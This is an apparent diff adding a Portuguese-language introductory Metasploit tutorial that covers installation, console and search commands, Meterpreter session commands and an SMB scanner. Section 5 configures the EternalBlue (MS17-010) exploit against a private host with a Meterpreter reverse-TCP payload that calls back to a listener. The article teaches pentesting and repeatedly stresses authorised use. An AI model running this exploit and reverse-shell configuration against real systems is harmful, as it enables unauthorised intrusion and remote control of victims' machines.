@@ -1,0 +1,144 @@
+# HACK24 — Introdução ao Metasploit Framework
+
+**⚠️ AVISO IMPORTANTE**
+
+Este artigo possui finalidade exclusivamente educacional e defensiva. O Metasploit Framework deve ser utilizado apenas em laboratórios, ambientes de testes ou durante avaliações de segurança previamente autorizadas. O uso não autorizado contra sistemas de terceiros pode configurar crime.
+
+---
+
+# 1. Introdução
+
+O **Metasploit Framework** é uma das plataformas mais conhecidas e utilizadas em testes de invasão (Pentest), pesquisas de segurança e validação de vulnerabilidades.
+
+Desenvolvido em **Ruby** e mantido pela comunidade de segurança, o framework disponibiliza milhares de módulos, incluindo exploits, payloads, scanners, módulos auxiliares, pós-exploração e ferramentas para automatizar diversas etapas de uma avaliação de segurança.
+
+Neste artigo conheceremos sua estrutura, instalação e os primeiros comandos utilizados no dia a dia de um pentester.
+
+---
+
+# 2. Instalação e Atualização
+
+No **Kali Linux**, o Metasploit normalmente já vem instalado.
+
+Atualize o sistema e inicialize o banco de dados do framework:
+
+```bash
+sudo apt update
+sudo apt full-upgrade -y
+
+sudo msfdb init
+msfupdate
+```
+
+Inicie o console do Metasploit:
+
+```bash
+msfconsole
+```
+
+---
+
+# 3. Comandos Básicos do Console
+
+```bash
+help              # Lista todos os comandos disponíveis
+version           # Exibe a versão instalada
+banner            # Mostra o banner do Metasploit
+clear             # Limpa a tela
+exit              # Encerra o console
+```
+
+---
+
+# 4. Buscando Módulos
+
+O comando `search` permite localizar rapidamente exploits, payloads e módulos auxiliares.
+
+Exemplos:
+
+```bash
+search eternalblue
+search type:exploit windows
+search type:payload
+search cve:2017-0144
+search smb
+```
+
+---
+
+# 5. Exemplo de Seleção de um Exploit
+
+Após localizar um módulo, ele pode ser carregado para inspeção e configuração.
+
+Exemplo:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+
+show options
+info
+
+set RHOSTS 192.168.1.100
+set RPORT 445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+
+show options
+```
+
+> **Observação:** os comandos acima são apresentados apenas para demonstrar o fluxo de configuração de um módulo durante um ambiente de laboratório ou avaliação autorizada. Não execute testes contra sistemas sem autorização formal.
+
+---
+
+# 6. Comandos Importantes do Meterpreter
+
+Após o estabelecimento de uma sessão autorizada em laboratório, alguns comandos frequentemente utilizados incluem:
+
+```bash
+sessions -l
+sessions -i 1
+
+sysinfo
+getuid
+background
+```
+
+Esses comandos permitem listar sessões, interagir com uma sessão ativa, obter informações básicas do sistema e retornar ao console principal do Metasploit.
+
+---
+
+# 7. Módulos Auxiliares (Auxiliary)
+
+Além dos exploits, o Metasploit oferece centenas de módulos auxiliares voltados para descoberta de ativos, coleta de informações e validação de serviços.
+
+Exemplo de utilização:
+
+```bash
+use auxiliary/scanner/smb/smb_version
+
+set RHOSTS 192.168.1.0/24
+
+run
+```
+
+Esses módulos são amplamente utilizados durante a fase de reconhecimento de uma avaliação de segurança.
+
+---
+
+# 8. Boas Práticas
+
+* Utilize o Metasploit somente em ambientes autorizados.
+* Mantenha o framework sempre atualizado.
+* Leia atentamente a documentação (`info`) antes de utilizar qualquer módulo.
+* Documente todas as atividades realizadas durante a auditoria.
+* Valide os resultados obtidos antes de emitir recomendações.
+* Prefira ambientes controlados para treinamento e estudos.
+
+---
+
+# Conclusão
+
+O Metasploit Framework permanece como uma das ferramentas mais importantes para profissionais de segurança ofensiva e Pentest. Sua grande coleção de módulos permite reproduzir cenários reais de exploração de vulnerabilidades, validar controles de segurança e compreender o impacto de falhas conhecidas.
+
+Dominar sua estrutura e seus principais comandos é um passo fundamental para qualquer profissional que deseja atuar com segurança ofensiva de forma ética, responsável e alinhada às boas práticas do mercado.
